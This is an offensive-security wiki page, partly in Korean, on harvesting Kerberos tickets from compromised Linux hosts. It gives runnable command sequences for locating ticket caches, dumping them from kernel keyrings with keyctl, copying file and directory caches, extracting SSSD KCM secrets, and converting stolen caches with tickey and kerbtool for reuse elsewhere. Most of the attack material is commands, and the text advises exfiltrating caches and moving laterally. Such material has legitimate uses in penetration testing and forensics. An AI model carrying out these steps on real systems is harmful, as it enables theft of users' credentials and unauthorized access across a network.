# Harvesting Tickets from Linux

{{#include ../../banners/hacktricks-training.md}}

### Credential Storage in Linux

Linux 시스템은 자격 증명을 세 가지 유형의 캐시에 저장합니다: **Files** (in `/tmp` directory), **Kernel Keyrings** (a special segment in the Linux kernel), 그리고 **Process Memory** (for single-process use). `/etc/krb5.conf`의 **default_ccache_name** 변수는 사용 중인 스토리지 유형을 알려주며, 지정되지 않으면 기본값은 `FILE:/tmp/krb5cc_%{uid}`입니다.

MIT/Heimdal은 또한 포스트 익스플로잇 중에 찾아봐야 할 추가 백엔드를 지원합니다:

- `DIR:/run/user/%{uid}/krb5cc` for directory-backed multi-ticket caches (systemd-logind default on modern distros).
- `KEYRING:persistent:%{uid}` or `KEYRING:session` to stash ccaches inside the kernel keyring (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, etc.).
- `KCM:%{uid}` when SSSD’s Kerberos Cache Manager daemon (kcm) fronts ticket storage.
- `MEMORY:unique_id` for process-local caches created by libraries (`gssproxy`, `sshd`, etc.).

셸을 획득할 때마다, 파일을 복사하기 전에 어떤 캐시 백엔드가 사용되는지 확인하려면 관심 있는 데몬 (e.g. Apache, sshd, gssproxy)의 `/proc/<pid>/environ`에서 `KRB5CCNAME`을 덤프하세요.

### Enumerating Active Caches

고가치 티켓을 놓치지 않도록 추출 전에 캐시를 열거하세요:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
The combination of `klist`, `keyctl`, and `/proc` inspection quickly reveals whether credentials live in files, keyrings, or KCM so you can pick the right dumping technique.

### 자격 증명 추출

The 2017 paper, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), outlines methods for extracting credentials from keyrings and processes, emphasizing the Linux kernel's keyring mechanism for managing and storing keys.

#### Keyring 추출 개요

커널 버전 2.6.10에서 도입된 **keyctl system call**은 사용자 공간 애플리케이션이 kernel keyrings와 상호작용할 수 있게 해준다. keyrings에 저장된 자격증명은 컴포넌트(기본 principal 및 credentials)로 저장되며, 헤더를 포함하는 파일 ccaches와는 다르다. 논문의 **hercules.sh script**는 이러한 컴포넌트들을 추출하고 재구성하여 사용 가능한 파일 ccache로 만드는 방법을 보여준다. keyring에 저장된 ccaches는 로그인 간 지속되는 `KEYRING:persistent:%{uid}`, 로그아웃 시 삭제되는 `KEYRING:session`, 또는 헬퍼 스레드를 생성하는 서비스의 경우 `KEY_SPEC_THREAD_KEYRING` 등에 존재할 수 있으니, 손상된 UID에 대해 모든 keyring 유형을 항상 열거하라.

#### Manual KEYRING 워크플로우

You can manually harvest tickets without helper scripts whenever `default_ccache_name` is set to `KEYRING:`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
여러 principals이 저장되어 있으면, 시리얼별로 `keyctl pipe` 단계를 반복한 다음, 추출한 ccache를 `kerbtool`(아래 참조) 또는 `ticketConverter.py` 같은 도구를 사용해 Windows에 호환되는 `.kirbi`/`.ccache`로 변환한 뒤 다른 머신에서 재사용하십시오.

#### File/DIR Cache Theft Quick Wins

자격 증명이 `FILE:` 또는 `DIR:` 캐시에 저장되어 있을 때는, 일반적으로 간단한 파일 작업만으로 충분합니다:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Directory caches contain one file per service ticket, so compress and exfiltrate the whole directory to keep TGT + TGS pairs intact. You can also point your tooling at the directory directly: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Dumping KCM-Managed Caches

SSSD의 Kerberos Cache Manager (kcm)는 `/var/run/kcm/kcmsock` (또는 `/run/.heim_org.h5l.kcm-socket`)을 통해 자격 증명 저장을 프록시하고, 암호화된 블롭을 `.secrets.mkey`와 함께 `/var/lib/sss/secrets/` 안에 지속적으로 저장합니다. 공격 순서:

1. `/etc/krb5.conf` (`default_ccache_name = KCM:`) 또는 `klist -l` 출력물을 통해 KCM 사용을 식별합니다.
2. UID 0이거나 `kcm` SELinux 도메인에 속해 있다면, 관리 도구를 통해 캐시를 열거합니다:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Offline approach: copy `/var/lib/sss/secrets/secrets.ldb` plus `/var/lib/sss/secrets/.secrets.mkey`, then run `SSSDKCMExtractor` (or similar PoCs) to decrypt and reassemble ccaches without touching the live socket. This is especially useful in forensics or when socket ACLs block you but disk access is possible.

kcm 데몬이 SSSD에 의해 강제되는 UID 기반 ACL을 준수하기 때문에, 일반적으로 root로의 권한 상승(또는 `sssd_kcm` 손상)이 필요하지만, 일단 달성하면 모든 사용자의 TGT를 몇 초 안에 덤프할 수 있습니다.

### Ticket Extraction Tooling

위 단계를 자동화하면 실수를 줄이고 Windows 도구에서 재생할 수 있는 크로스 플랫폼 티켓 자료를 얻을 수 있습니다.

#### Tickey

Building on the principles of the **hercules.sh script**, the [**tickey**](https://github.com/TarlogicSecurity/tickey) tool is specifically designed for extracting tickets from keyrings, executed via `/tmp/tickey -i`. It enumerates kernel keyrings, reconstructs the serialized ccaches, and writes MIT-compatible cache files you can immediately feed to `klist`, `impacket-*`, or `kerberoast` tooling.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) is a modern Go utility that runs natively on Linux and can parse, convert, and request Kerberos tickets. Two handy use cases when harvesting from Linux boxes:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
implant host에 tickey와 kerbtool을 모두 두면 Linux, Windows 및 cross-platform Kerberos attack chains 사이를 원활하게 이동할 수 있습니다.

## 참고자료

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
